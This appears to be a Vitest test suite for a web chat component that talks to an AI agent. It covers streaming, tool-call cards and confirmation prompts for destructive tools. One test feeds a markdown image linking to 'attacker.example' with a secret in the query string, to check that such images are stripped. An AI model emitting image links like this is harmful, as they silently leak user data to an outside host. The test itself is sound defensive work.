import type { Context, Tool } from "@ag-ui/core";
import { beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { ELEMENT_TAG, MESSAGE_ROLE, SUBMIT_EVENT } from "../src/constants.js";
import type { AgUiChat, SubmitDetail } from "../src/core/ag_ui_chat.js";
import { SessionStorageStore } from "../src/core/conversation_store.js";
import { defineAgUiChat } from "../src/core/define_ag_ui_chat.js";
import { RemoteConversationStore } from "../src/core/remote_conversation_store.js";
import { type Emit, makeFakeAgent } from "./helpers/fake_agent.js";

/** Mount the element with a fake agent factory and an optional run script. */
function mountWithAgent(
  script: (emit: Emit) => void | Promise<void>,
  extra: { tools?: Tool[]; context?: Context[] } = {},
): { el: AgUiChat; handle: ReturnType<typeof makeFakeAgent> } {
  const el = document.createElement(ELEMENT_TAG) as AgUiChat;
  el.setAttribute("endpoint", "/agent/");
  const handle = makeFakeAgent({ script });
  el.agentFactory = () => handle.agent;
  if (extra.tools !== undefined) {
    el.getTools = () => extra.tools as Tool[];
  }
  if (extra.context !== undefined) {
    el.getContext = () => extra.context as Context[];
  }
  document.body.appendChild(el);
  return { el, handle };
}

/** Drain pending microtasks a few times so async submit + fake run settle. */
async function flush(): Promise<void> {
  for (let i = 0; i < 5; i += 1) {
    await Promise.resolve();
  }
}

async function send(el: AgUiChat, text: string): Promise<void> {
  sendNoWait(el, text);
  await flush();
}

/**
 * Click Send without awaiting the run. Used by confirmation tests that must
 * interact mid-run (the run blocks on the inline confirmation card until a
 * button is clicked): call this, ``await flush()`` to reach the card, click,
 * then ``await flush()`` again to let the tool execute and the run settle.
 */
function sendNoWait(el: AgUiChat, text: string): void {
  const input = shadow(el).querySelector<HTMLTextAreaElement>(".input");
  if (input === null) {
    throw new Error("expected an input");
  }
  input.value = text;
  shadow(el).querySelector<HTMLButtonElement>(".send")?.click();
}

function mount(attrs: Record<string, string> = {}): AgUiChat {
  const el = document.createElement(ELEMENT_TAG) as AgUiChat;
  for (const [key, value] of Object.entries(attrs)) {
    el.setAttribute(key, value);
  }
  document.body.appendChild(el);
  return el;
}

function shadow(el: AgUiChat): ShadowRoot {
  const root = el.shadowRoot;
  if (root === null) {
    throw new Error("expected a shadow root");
  }
  return root;
}

function inputOf(el: AgUiChat): HTMLTextAreaElement {
  const input = shadow(el).querySelector<HTMLTextAreaElement>(".input");
  if (input === null) {
    throw new Error("expected an input");
  }
  return input;
}

describe("AgUiChat", () => {
  beforeAll(() => {
    defineAgUiChat();
  });

  beforeEach(() => {
    document.body.innerHTML = "";
    sessionStorage.clear();
  });

  it("renders the shell into an open shadow root", () => {
    const el = mount();
    const root = shadow(el);
    expect(root.querySelector(".chat")).not.toBeNull();
    expect(root.querySelector(".messages")).not.toBeNull();
    expect(root.querySelector(".input")).not.toBeNull();
    expect(root.querySelector(".send")).not.toBeNull();
  });

  it("defaults the header to 'Assistant' and honours title-text", () => {
    expect(shadow(mount()).querySelector(".header-title")?.textContent).toBe("Assistant");
    expect(
      shadow(mount({ "title-text": "Admin Copilot" })).querySelector(".header-title")?.textContent,
    ).toBe("Admin Copilot");
  });

  it("new-chat clears the transcript", () => {
    const el = mount();
    el.appendMessage(MESSAGE_ROLE.USER, "hi");
    el.appendMessage(MESSAGE_ROLE.ASSISTANT, "hello");
    expect(shadow(el).querySelectorAll(".message")).toHaveLength(2);
    shadow(el).querySelector<HTMLButtonElement>(".header-btn--new")?.click();
    expect(shadow(el).querySelectorAll(".message")).toHaveLength(0);
  });

  it("toggles collapsed: reflects the attribute, persists, and emits a toggle event", () => {
    const el = mount();
    const events: boolean[] = [];
    el.addEventListener("ag-ui-toggle", (e) => {
      events.push((e as CustomEvent<{ collapsed: boolean }>).detail.collapsed);
    });
    expect(el.collapsed).toBe(false);

    shadow(el).querySelector<HTMLButtonElement>(".header-btn--collapse")?.click();
    expect(el.collapsed).toBe(true);
    expect(el.hasAttribute("collapsed")).toBe(true);
    expect(sessionStorage.getItem("ag-ui-chat:collapsed")).toBe("1");

    el.toggleCollapsed();
    expect(el.collapsed).toBe(false);
    expect(sessionStorage.getItem("ag-ui-chat:collapsed")).toBe("0");
    expect(events).toEqual([true, false]);
  });

  it("restores the collapsed state from session storage on mount", () => {
    sessionStorage.setItem("ag-ui-chat:collapsed", "1");
    expect(mount().collapsed).toBe(true);
  });

  it("exposes the endpoint attribute, defaulting to empty string", () => {
    expect(mount().endpoint).toBe("");
    expect(mount({ endpoint: "/agent/" }).endpoint).toBe("/agent/");
  });

  it("reflects property setters to attributes (framework interop)", () => {
    const el = mount();
    el.endpoint = "/api/agent/";
    expect(el.getAttribute("endpoint")).toBe("/api/agent/");
    expect(el.endpoint).toBe("/api/agent/");

    el.toolDisplay = "minimal";
    expect(el.getAttribute("data-tool-display")).toBe("minimal");
    expect(el.toolDisplay).toBe("minimal");

    el.collapsed = true;
    expect(el.hasAttribute("collapsed")).toBe(true);
    expect(el.collapsed).toBe(true);
  });

  it("appendMessage renders a role-tagged bubble", () => {
    const el = mount();
    const bubble = el.appendMessage(MESSAGE_ROLE.ASSISTANT, "hello");
    expect(bubble.className).toBe("message message--assistant");
    expect(bubble.textContent).toBe("hello");
    expect(shadow(el).querySelectorAll(".message")).toHaveLength(1);
  });

  it("reads the tool-display mode from the data-tool-display attribute", () => {
    expect(mount().toolDisplay).toBe("full");
    expect(mount({ "data-tool-display": "minimal" }).toolDisplay).toBe("minimal");
    expect(mount({ "data-tool-display": "compact" }).toolDisplay).toBe("compact");
    expect(mount({ "data-tool-display": "bogus" }).toolDisplay).toBe("full");
  });

  it("renders assistant content as markdown but keeps user content literal", () => {
    const el = mount();
    const assistant = el.appendMessage(MESSAGE_ROLE.ASSISTANT, "**bold**");
    expect(assistant.querySelector("strong")?.textContent).toBe("bold");
    const user = el.appendMessage(MESSAGE_ROLE.USER, "**bold**");
    expect(user.querySelector("strong")).toBeNull();
    expect(user.textContent).toBe("**bold**");
  });

  it("strips img from assistant bubbles by default; allowImages opts back in", () => {
    const el = mount();
    const blocked = el.appendMessage(
      MESSAGE_ROLE.ASSISTANT,
      "![x](https://attacker.example/?d=secret)",
    );
    expect(blocked.querySelector("img")).toBeNull();
    el.allowImages = true;
    const permitted = el.appendMessage(MESSAGE_ROLE.ASSISTANT, "![x](https://ex.com/i.png)");
    expect(permitted.querySelector("img")?.getAttribute("src")).toBe("https://ex.com/i.png");
  });

  it("hands the agent factory a live header getter (rotated tokens reach the agent)", async () => {
    const el = document.createElement(ELEMENT_TAG) as AgUiChat;
    el.setAttribute("endpoint", "/agent/");
    el.headers = { Authorization: "Bearer token-1" };
    const handle = makeFakeAgent({
      script: (emit) => {
        emit.runStart();
        emit.runEnd();
      },
    });
    let captured: (() => Record<string, string>) | undefined;
    el.agentFactory = (options) => {
      captured = options.getHeaders;
      return handle.agent;
    };
    document.body.appendChild(el);
    await send(el, "hi");
    expect(captured?.()).toEqual({ Authorization: "Bearer token-1" });
    // Rotate after the client (and agent) were built and cached.
    el.headers = { Authorization: "Bearer token-2" };
    expect(captured?.()).toEqual({ Authorization: "Bearer token-2" });
  });

  it("submits on send-button click: appends a user bubble and emits the event", () => {
    // No endpoint here: this asserts the submit-event + user-bubble seam in
    // isolation, without engaging the AG-UI client / network path.
    const el = mount();
    const onSubmit = vi.fn();
    el.addEventListener(SUBMIT_EVENT, (e) => onSubmit((e as CustomEvent<SubmitDetail>).detail));

    const input = inputOf(el);
    input.value = "  count users  ";
    shadow(el).querySelector<HTMLButtonElement>(".send")?.click();

    expect(onSubmit).toHaveBeenCalledWith({ content: "count users" });
    expect(input.value).toBe("");
    const bubbles = shadow(el).querySelectorAll(".message--user");
    expect(bubbles).toHaveLength(1);
    expect(bubbles[0]?.textContent).toBe("count users");
  });

  it("does not submit when the input is blank", () => {
    const el = mount();
    const onSubmit = vi.fn();
    el.addEventListener(SUBMIT_EVENT, onSubmit);

    inputOf(el).value = "   ";
    shadow(el).querySelector<HTMLButtonElement>(".send")?.click();

    expect(onSubmit).not.toHaveBeenCalled();
    expect(shadow(el).querySelectorAll(".message")).toHaveLength(0);
  });

  it("submits on Enter without Shift", () => {
    const el = mount();
    const onSubmit = vi.fn();
    el.addEventListener(SUBMIT_EVENT, onSubmit);

    const input = inputOf(el);
    input.value = "go";
    input.dispatchEvent(
      new KeyboardEvent("keydown", { key: "Enter", shiftKey: false, cancelable: true }),
    );

    expect(onSubmit).toHaveBeenCalledTimes(1);
  });

  it("does not submit on Shift+Enter or other keys", () => {
    const el = mount();
    const onSubmit = vi.fn();
    el.addEventListener(SUBMIT_EVENT, onSubmit);

    const input = inputOf(el);
    input.value = "multi\nline";
    input.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", shiftKey: true }));
    input.dispatchEvent(new KeyboardEvent("keydown", { key: "a", shiftKey: false }));

    expect(onSubmit).not.toHaveBeenCalled();
  });

  it("submits via Enter and drives the client (covers keydown path)", async () => {
    const { el } = mountWithAgent((emit) => {
      emit.text("hi");
      emit.textEnd("hi");
    });
    const input = inputOf(el);
    input.value = "hello";
    input.dispatchEvent(
      new KeyboardEvent("keydown", { key: "Enter", shiftKey: false, cancelable: true }),
    );
    await Promise.resolve();
    await Promise.resolve();
    expect(shadow(el).querySelector(".message--assistant")?.textContent).toBe("hi");
  });

  it("reveals an at-once assistant message word-by-word when data-text-animation=word", async () => {
    const el = document.createElement(ELEMENT_TAG) as AgUiChat;
    el.setAttribute("endpoint", "/agent/");
    el.setAttribute("data-text-animation", "word");
    const handle = makeFakeAgent({
      script: (emit) => {
        emit.runStart();
        emit.text("hello world"); // single delta → message arrived at once
        emit.textEnd("hello world");
        emit.runEnd();
      },
    });
    el.agentFactory = () => handle.agent;
    document.body.appendChild(el);
    await send(el, "hi");

    const words = shadow(el).querySelectorAll(".message--assistant .word");
    expect([...words].map((w) => w.textContent)).toEqual(["hello", "world"]);
  });

  it("does NOT re-animate a multi-delta streamed message in word mode", async () => {
    const el = document.createElement(ELEMENT_TAG) as AgUiChat;
    el.setAttribute("endpoint", "/agent/");
    el.setAttribute("data-text-animation", "word");
    const handle = makeFakeAgent({
      script: (emit) => {
        emit.runStart();
        emit.text("hello"); // streamed progressively across several deltas…
        emit.text("hello world");
        emit.text("hello world foo");
        emit.textEnd("hello world foo");
        emit.runEnd();
      },
    });
    el.agentFactory = () => handle.agent;
    document.body.appendChild(el);
    await send(el, "hi");

    // It already revealed as it streamed, so the finished message must not be
    // re-wrapped into staggered .word spans (the jarring replay bug).
    expect(shadow(el).querySelectorAll(".message--assistant .word")).toHaveLength(0);
    expect(shadow(el).querySelector(".message--assistant")?.textContent).toBe("hello world foo");
  });

  it("streams assistant text into a single growing bubble", async () => {
    const { el } = mountWithAgent((emit) => {
      emit.runStart();
      emit.text("Pa");
      emit.text("Paris");
      emit.textEnd("Paris");
      emit.runEnd();
    });
    await send(el, "capital of France?");

    const assistantBubbles = shadow(el).querySelectorAll(".message--assistant");
    expect(assistantBubbles).toHaveLength(1);
    expect(assistantBubbles[0]?.textContent).toBe("Paris");
  });

  it("swaps the composer button to Stop while running and back to Send after settle", async () => {
    let midRun: { label: string | null; aria: string | null; state: string | undefined } | null =
      null;
    const { el } = mountWithAgent((emit) => {
      emit.runStart();
      const button = shadow(el).querySelector<HTMLButtonElement>(".send");
      midRun = {
        label: button?.textContent ?? null,
        aria: button?.getAttribute("aria-label") ?? null,
        state: button?.dataset["state"],
      };
      emit.runEnd();
    });
    await send(el, "go");
    expect(midRun).toEqual({ label: "Stop", aria: "Stop", state: "running" });
    const button = shadow(el).querySelector<HTMLButtonElement>(".send");
    expect(button?.textContent).toBe("Send");
    expect(button?.getAttribute("aria-label")).toBe("Send");
    expect(button?.dataset["state"]).toBe("idle");
  });

  it("renders a tool-call card with name, args, and a status", async () => {
    const { el } = mountWithAgent((emit) => {
      emit.toolCall("tc1", "fill_field", { name: "city" });
    });
    await send(el, "fill the city");
    const card = shadow(el).querySelector<HTMLElement>(".tool-call");
    expect(card?.getAttribute("data-tool-name")).toBe("fill_field");
    // No label found anywhere -> auto-prettified snake_case fallback.
    expect(card?.querySelector(".tool-call-name")?.textContent).toBe("🔧 Fill field");
    expect(card?.querySelector(".tool-call-args")?.textContent).toContain('"name": "city"');
    // fill_field isn't registered here, so it's treated as server-executed.
    expect(card?.getAttribute("data-status")).toBe("done");
  });

  it("settles the tool-call card to done with the result body", async () => {
    let round = 0;
    const { el } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "count_users", { active: true });
      }
      round += 1;
    });
    el.registerTool({
      name: "count_users",
      description: "count",
      parameters: { type: "object" },
      handler: () => 42,
    });
    await send(el, "count active users");
    const card = shadow(el).querySelector<HTMLElement>(".tool-call");
    expect(card?.getAttribute("data-status")).toBe("done");
    expect(card?.querySelector(".tool-call-result")?.textContent).toBe("42");
  });

  it("settles the tool-call card to error when the handler throws", async () => {
    let round = 0;
    const { el } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "boom", {});
      }
      round += 1;
    });
    el.registerTool({
      name: "boom",
      description: "explodes",
      parameters: { type: "object" },
      handler: () => {
        throw new Error("kaboom");
      },
    });
    await send(el, "trigger boom");
    const card = shadow(el).querySelector<HTMLElement>(".tool-call");
    expect(card?.getAttribute("data-status")).toBe("error");
    expect(card?.querySelector(".tool-call-result")?.textContent).toBe("kaboom");
  });

  it("settles the tool-call card to declined on cancel", async () => {
    let round = 0;
    const { el } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "delete_user", { id: 7 });
      }
      round += 1;
    });
    el.registerTool({
      name: "delete_user",
      description: "delete",
      parameters: { type: "object", "x-destructive": true },
      handler: () => "deleted",
    });

    sendNoWait(el, "delete user 7");
    await flush();
    shadow(el).querySelector<HTMLButtonElement>(".confirm-btn--cancel")?.click();
    await flush();

    const card = shadow(el).querySelector<HTMLElement>(".tool-call");
    expect(card?.getAttribute("data-status")).toBe("declined");
    expect(card?.querySelector(".tool-call-result")?.textContent).toBe("User declined the action.");
  });

  it("renders an error bubble and re-enables send", async () => {
    const { el } = mountWithAgent((emit) => {
      emit.runStart();
      emit.error("model exploded");
    });
    await send(el, "boom");
    const bubble = shadow(el).querySelector(".message--assistant");
    expect(bubble?.textContent).toContain("model exploded");
    expect(shadow(el).querySelector<HTMLButtonElement>(".send")?.disabled).toBe(false);
  });

  it("shows a pending indicator after run start and hides it once text streams", async () => {
    let pendingWhileThinking = 0;
    const { el } = mountWithAgent((emit) => {
      emit.runStart();
      pendingWhileThinking = shadow(el).querySelectorAll(".pending").length;
      emit.text("hi");
      emit.textEnd("hi");
      emit.runEnd();
    });
    await send(el, "q");
    expect(pendingWhileThinking).toBe(1);
    expect(shadow(el).querySelectorAll(".pending")).toHaveLength(0);
  });

  it("keeps a single pending indicator if run start fires twice", async () => {
    let count = 0;
    const { el } = mountWithAgent((emit) => {
      emit.runStart();
      emit.runStart();
      count = shadow(el).querySelectorAll(".pending").length;
      emit.runEnd();
    });
    await send(el, "q");
    expect(count).toBe(1);
    expect(shadow(el).querySelectorAll(".pending")).toHaveLength(0);
  });

  it("clears the pending indicator on error", async () => {
    const { el } = mountWithAgent((emit) => {
      emit.runStart();
      emit.error("boom");
    });
    await send(el, "q");
    expect(shadow(el).querySelectorAll(".pending")).toHaveLength(0);
  });

  it("clears the pending indicator after a server-only tool round (no client re-run)", async () => {
    const { el } = mountWithAgent((emit) => {
      emit.runStart();
      emit.toolCall("tc1", "server_only", {});
      emit.runEnd();
    });
    await send(el, "do server thing");
    // server_only isn't registered and no TOOL_CALL_RESULT arrived → settled
    // with the honest "no result" fallback (not a false "executed on the
    // server"). The indicator must NOT linger: a server tool never triggers
    // another client round, so re-showing it would leave it stuck.
    const card = shadow(el).querySelector(".tool-call");
    expect(card?.getAttribute("data-status")).toBe("done");
    expect(card?.querySelector(".tool-call-result")?.textContent).toContain("No result returned.");
    expect(shadow(el).querySelectorAll(".pending")).toHaveLength(0);
  });

  it("renders a server-side tool's streamed result in its card", async () => {
    const { el } = mountWithAgent((emit) => {
      emit.runStart();
      emit.toolCall("tc1", "server_only", {});
      emit.toolResult("tc1", '{"projects":3}');
      emit.runEnd();
    });
    await send(el, "list projects");
    const card = shadow(el).querySelector(".tool-call");
    expect(card?.getAttribute("data-status")).toBe("done");
    const result = card?.querySelector(".tool-call-result")?.textContent;
    expect(result).toContain('{"projects":3}');
    // The streamed result already settled it, so the executeTool sweep must
    // not overwrite with the fallback.
    expect(result).not.toContain("No result returned.");
    expect(shadow(el).querySelectorAll(".pending")).toHaveLength(0);
  });

  it("ignores a tool result for an unknown call id", async () => {
    const { el } = mountWithAgent((emit) => {
      emit.runStart();
      emit.toolResult("ghost", "orphan");
      emit.runEnd();
    });
    await send(el, "x");
    expect(shadow(el).querySelectorAll(".tool-call")).toHaveLength(0);
  });

  it("labels a server tool's card from the toolSummaries map", async () => {
    const { el } = mountWithAgent((emit) => {
      emit.runStart();
      emit.toolCall("tc1", "list_projects", {});
      emit.runEnd();
    });
    // Server tool: no schema reaches the browser, so the friendly label comes
    // from the host-supplied map.
    el.toolSummaries = { list_projects: "Search projects" };
    await send(el, "find projects");
    const label = shadow(el).querySelector(".tool-call .tool-call-name")?.textContent;
    expect(label).toContain("Search projects");
    expect(label).not.toContain("list_projects");
  });

  it("labels a server tool's card from the fetched data-tools-url catalog", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue({
        json: () => Promise.resolve([{ name: "list_projects", summary: "Search projects" }]),
      }),
    );
    const el = document.createElement(ELEMENT_TAG) as AgUiChat;
    el.setAttribute("endpoint", "/agent/");
    el.setAttribute("data-tools-url", "/agent/tools/");
    const handle = makeFakeAgent({
      script: (emit) => {
        emit.runStart();
        emit.toolCall("tc1", "list_projects", {});
        emit.runEnd();
      },
    });
    el.agentFactory = () => handle.agent;
    document.body.appendChild(el);
    await flush(); // let the catalog fetch resolve
    await send(el, "find projects");
    const label = shadow(el).querySelector(".tool-call .tool-call-name")?.textContent;
    expect(label).toContain("Search projects");
  });

  it("ignores a failed data-tools-url fetch (card falls back to the prettified name)", async () => {
    vi.stubGlobal("fetch", vi.fn().mockRejectedValue(new Error("offline")));
    const el = document.createElement(ELEMENT_TAG) as AgUiChat;
    el.setAttribute("endpoint", "/agent/");
    el.setAttribute("data-tools-url", "/agent/tools/");
    const handle = makeFakeAgent({
      script: (emit) => {
        emit.runStart();
        emit.toolCall("tc1", "list_projects", {});
        emit.runEnd();
      },
    });
    el.agentFactory = () => handle.agent;
    document.body.appendChild(el);
    await flush();
    await send(el, "find projects");
    expect(shadow(el).querySelector(".tool-call .tool-call-name")?.textContent).toContain(
      "List projects",
    );
  });

  it("chains a server tool and a client tool in one round: both cards, then continues", async () => {
    let round = 0;
    const { el } = mountWithAgent((emit) => {
      if (round === 0) {
        // One turn that mixes a server-executed tool (result streamed) with a
        // frontend tool the client must run — the agent's server→UI chain.
        emit.runStart();
        emit.toolCall("srv1", "server_tool", {});
        emit.toolResult("srv1", '{"found":1}');
        emit.toolCall("ui1", "fill_field", { value: "Paris" });
        emit.runEnd();
      } else {
        emit.runStart();
        emit.text("all set");
        emit.textEnd("all set");
        emit.runEnd();
      }
      round += 1;
    });
    el.registerTool({
      name: "fill_field",
      description: "fill a field",
      parameters: { type: "object" },
      handler: () => "filled-ok",
    });
    el.setAttribute("data-tool-display", "full");
    await send(el, "do both");

    // Both cards render; the server card shows its streamed result, not the fallback.
    expect(shadow(el).querySelectorAll(".tool-call")).toHaveLength(2);
    const srv = shadow(el).querySelector<HTMLElement>('.tool-call[data-tool-name="server_tool"]');
    const srvResult = srv?.querySelector(".tool-call-result")?.textContent;
    expect(srvResult).toContain('{"found":1}');
    expect(srvResult).not.toContain("No result returned.");
    const ui = shadow(el).querySelector<HTMLElement>('.tool-call[data-tool-name="fill_field"]');
    expect(ui?.querySelector(".tool-call-result")?.textContent).toContain("filled-ok");
    // The frontend tool drove a second round, which finished cleanly.
    expect(round).toBe(2);
    expect(shadow(el).querySelector(".message--assistant")?.textContent).toContain("all set");
    expect(shadow(el).querySelectorAll(".pending")).toHaveLength(0);
  });

  it("updates the header title when the title-text attribute changes", () => {
    const el = mount({ "title-text": "First" });
    expect(shadow(el).querySelector(".header-title")?.textContent).toBe("First");
    el.setAttribute("title-text", "Second");
    expect(shadow(el).querySelector(".header-title")?.textContent).toBe("Second");
    el.removeAttribute("title-text");
    expect(shadow(el).querySelector(".header-title")?.textContent).toBe("Assistant");
  });

  it("exposes a read_page tool only when a page-map provider is set", () => {
    const el = mount();
    expect(el.getTools().some((t) => t.name === "read_page")).toBe(false);
    el.getPageMap = () => ({ path: "/x" });
    expect(el.getTools().some((t) => t.name === "read_page")).toBe(true);
  });

  it("executes the built-in read_page tool, returning the page map", async () => {
    let round = 0;
    const { el, handle } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "read_page", {});
      }
      round += 1;
    });
    el.getPageMap = () => ({ path: "/here" });
    await send(el, "where am i");
    expect(handle.messages.find((m) => m.role === "tool")?.content).toContain("/here");
  });

  it("confirmPredicate forces confirmation for a non-destructive tool", async () => {
    let round = 0;
    let ran = false;
    const { el } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "noop", {});
      }
      round += 1;
    });
    el.confirmPredicate = () => true;
    el.registerTool({
      name: "noop",
      description: "d",
      parameters: { type: "object" },
      handler: () => {
        ran = true;
        return "ok";
      },
    });
    sendNoWait(el, "go");
    await flush();
    expect(shadow(el).querySelector(".confirm-btn--confirm")).not.toBeNull();
    shadow(el).querySelector<HTMLButtonElement>(".confirm-btn--cancel")?.click();
    await flush();
    expect(ran).toBe(false);
  });

  it("confirmPredicate skips confirmation for a destructive tool when it returns false", async () => {
    let round = 0;
    let ran = false;
    const { el } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "del", {});
      }
      round += 1;
    });
    el.confirmPredicate = () => false;
    el.registerTool({
      name: "del",
      description: "d",
      parameters: { type: "object", "x-destructive": true },
      handler: () => {
        ran = true;
        return "ok";
      },
    });
    await send(el, "go");
    expect(ran).toBe(true);
    expect(shadow(el).querySelector(".confirm")).toBeNull();
  });

  it("renders a tool-call card with the frontend tool's x-summary label", async () => {
    let round = 0;
    const { el } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "query", {});
      }
      round += 1;
    });
    el.registerTool({
      name: "query",
      description: "d",
      parameters: { type: "object", "x-summary": "Query orders" },
      handler: () => "ok",
    });
    await send(el, "go");
    expect(shadow(el).querySelector(".tool-call-name")?.textContent).toBe("🔧 Query orders");
  });

  it("forwards the current tools and context to the run", async () => {
    const tools: Tool[] = [
      { name: "fill_field", description: "d", parameters: { type: "object" } },
    ];
    const context: Context[] = [{ description: "route", value: "changeform" }];
    const { el, handle } = mountWithAgent(() => {}, { tools, context });
    await send(el, "x");
    expect(handle.lastRunParams).toEqual({ tools, context });
  });

  it("does not build a client when no endpoint is set", async () => {
    const el = mount(); // no endpoint attribute
    let factoryCalled = false;
    el.agentFactory = () => {
      factoryCalled = true;
      return makeFakeAgent().agent;
    };
    inputOf(el).value = "hello";
    shadow(el).querySelector<HTMLButtonElement>(".send")?.click();
    await Promise.resolve();
    expect(factoryCalled).toBe(false);
    // The user bubble still renders; only the network path is skipped.
    expect(shadow(el).querySelectorAll(".message--user")).toHaveLength(1);
  });

  it("reuses a single client across multiple sends", async () => {
    let factoryCalls = 0;
    const el = document.createElement(ELEMENT_TAG) as AgUiChat;
    el.setAttribute("endpoint", "/agent/");
    const handle = makeFakeAgent({
      script: (emit) => {
        emit.text("ok");
        emit.textEnd("ok");
      },
    });
    el.agentFactory = () => {
      factoryCalls += 1;
      return handle.agent;
    };
    document.body.appendChild(el);

    await send(el, "first");
    await send(el, "second");

    expect(factoryCalls).toBe(1);
    expect(handle.messages.map((m) => m.content)).toEqual(["first", "second"]);
  });

  it("exposes registered tools to the run via getTools", async () => {
    let round = 0;
    const { el, handle } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.text("listing");
        emit.textEnd("listing");
      }
      round += 1;
    });
    el.registerTool({
      name: "count_users",
      description: "count users",
      parameters: { type: "object" },
      handler: () => 42,
    });
    await send(el, "how many?");
    expect(handle.lastRunParams?.tools).toEqual([
      { name: "count_users", description: "count users", parameters: { type: "object" } },
    ]);
  });

  it("executes a non-destructive tool without confirmation and posts the result", async () => {
    let round = 0;
    let received: Record<string, unknown> | null = null;
    const { el, handle } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "count_users", { active: true });
      }
      round += 1;
    });
    el.registerTool({
      name: "count_users",
      description: "count",
      parameters: { type: "object" },
      handler: (args) => {
        received = args;
        return 42;
      },
    });
    await send(el, "count active users");

    expect(received).toEqual({ active: true });
    expect(shadow(el).querySelector(".confirm")).toBeNull();
    const toolMsg = handle.messages.find((m) => m.role === "tool");
    expect(toolMsg?.content).toBe("42");
  });

  it("shows an inline confirmation card for a destructive tool and runs it on confirm", async () => {
    let round = 0;
    let ran = false;
    const { el, handle } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "delete_user", { id: 7 });
      }
      round += 1;
    });
    el.registerTool({
      name: "delete_user",
      description: "delete",
      parameters: { type: "object", "x-destructive": true },
      handler: () => {
        ran = true;
        return "deleted";
      },
    });

    sendNoWait(el, "delete user 7");
    await flush();
    const confirmBtn = shadow(el).querySelector<HTMLButtonElement>(".confirm-btn--confirm");
    expect(confirmBtn).not.toBeNull();
    confirmBtn?.click();
    await flush();

    expect(ran).toBe(true);
    expect(handle.messages.find((m) => m.role === "tool")?.content).toBe('"deleted"');
  });

  it("declines a destructive tool on cancel and posts a decline message", async () => {
    let round = 0;
    let ran = false;
    const { el, handle } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "delete_user", { id: 7 });
      }
      round += 1;
    });
    el.registerTool({
      name: "delete_user",
      description: "delete",
      parameters: { type: "object", "x-destructive": true },
      handler: () => {
        ran = true;
        return "deleted";
      },
    });

    sendNoWait(el, "delete user 7");
    await flush();
    shadow(el).querySelector<HTMLButtonElement>(".confirm-btn--cancel")?.click();
    await flush();

    expect(ran).toBe(false);
    expect(handle.messages.find((m) => m.role === "tool")?.content).toBe(
      "User declined the action.",
    );
  });

  it("skips confirmation for a destructive tool when autoConfirm is set", async () => {
    let round = 0;
    let ran = false;
    const { el } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "delete_user", { id: 7 });
      }
      round += 1;
    });
    el.autoConfirm = true;
    el.registerTool({
      name: "delete_user",
      description: "delete",
      parameters: { type: "object", "x-destructive": true },
      handler: () => {
        ran = true;
        return "deleted";
      },
    });
    await send(el, "delete user 7");
    expect(ran).toBe(true);
    expect(shadow(el).querySelector(".confirm")).toBeNull();
  });

  it("shows the x-confirm message inline for a destructive tool", async () => {
    let round = 0;
    const { el } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "set_status", { active: true });
      }
      round += 1;
    });
    el.registerTool({
      name: "set_status",
      description: "set status",
      parameters: { type: "object", "x-destructive": true, "x-confirm": "Activate this project?" },
      handler: () => "ok",
    });

    sendNoWait(el, "activate it");
    await flush();
    expect(shadow(el).querySelector(".confirm-body")?.textContent).toBe("Activate this project?");
    shadow(el).querySelector<HTMLButtonElement>(".confirm-btn--cancel")?.click();
    await flush();
  });

  it("captures a tool handler error into the result message", async () => {
    let round = 0;
    const { el, handle } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "boom", {});
      }
      round += 1;
    });
    el.registerTool({
      name: "boom",
      description: "explodes",
      parameters: { type: "object" },
      handler: () => {
        throw new Error("kaboom");
      },
    });
    await send(el, "trigger boom");
    expect(handle.messages.find((m) => m.role === "tool")?.content).toContain("kaboom");
  });

  it("stringifies a non-Error throw from a tool handler", async () => {
    let round = 0;
    const { el, handle } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "boom", {});
      }
      round += 1;
    });
    el.registerTool({
      name: "boom",
      description: "explodes",
      parameters: { type: "object" },
      handler: () => {
        throw "string failure";
      },
    });
    await send(el, "trigger boom");
    expect(handle.messages.find((m) => m.role === "tool")?.content).toContain("string failure");
  });

  it("serialises a nullish tool result as null", async () => {
    let round = 0;
    const { el, handle } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("tc1", "noop", {});
      }
      round += 1;
    });
    el.registerTool({
      name: "noop",
      description: "returns nothing",
      parameters: { type: "object" },
      handler: () => undefined,
    });
    await send(el, "do nothing");
    expect(handle.messages.find((m) => m.role === "tool")?.content).toBe("null");
  });

  it("rehydrates persisted text messages into bubbles on mount", async () => {
    const store = new SessionStorageStore();
    const tid = store.threadId();
    store.saveMessages(tid, [
      { id: "0", role: "user", content: "" }, // empty user → skipped
      { id: "1", role: "user", content: "hi" },
      { id: "2", role: "assistant", content: "hello" },
      { id: "3", role: "assistant", content: "" }, // empty → skipped
      { id: "4", role: "tool", content: "tool out", toolCallId: "x" }, // no matching card → skipped
      { id: "5", role: "assistant" }, // no content → skipped
    ] as never);

    const el = document.createElement(ELEMENT_TAG) as AgUiChat;
    el.setAttribute("endpoint", "/agent/");
    el.conversationStore = store;
    document.body.appendChild(el);
    await flush();

    const bubbles = shadow(el).querySelectorAll(".message");
    expect([...bubbles].map((b) => b.textContent)).toEqual(["hi", "hello"]);
  });

  it("restores history statically — no entrance animation on reload (word mode)", async () => {
    const store = new SessionStorageStore();
    const tid = store.threadId();
    store.saveMessages(tid, [
      { id: "1", role: "user", content: "hi" },
      { id: "2", role: "assistant", content: "hello there world" },
    ] as never);

    const el = document.createElement(ELEMENT_TAG) as AgUiChat;
